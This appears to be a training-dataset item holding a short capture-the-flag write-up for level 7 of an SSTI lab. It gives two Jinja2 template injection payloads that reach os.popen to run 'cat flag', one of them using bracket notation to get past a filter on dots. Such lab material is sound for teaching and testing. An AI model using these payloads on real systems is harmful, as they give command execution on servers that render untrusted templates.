# SSTI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: ssti
- cwe: CWE-1336

## Scenario

What happens during 'Level 7' when solving 'SSTI_Labs'?

## Analysis / Response

### Level 7
* This level doesn't allow dots
* We can do somethin similar to what we did in the last one and use give all the properties as strings:

* Here is the original payload along with the dots removed and all functions placed inside quotes and square brackets
```python3
{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}

{{ " "["__class__"]["__base__"]["__subclasses__"]()[140]["__init__"]["__globals__"]['sys']["modules"]['os']["popen"]('cat flag')["read"]() }}

```
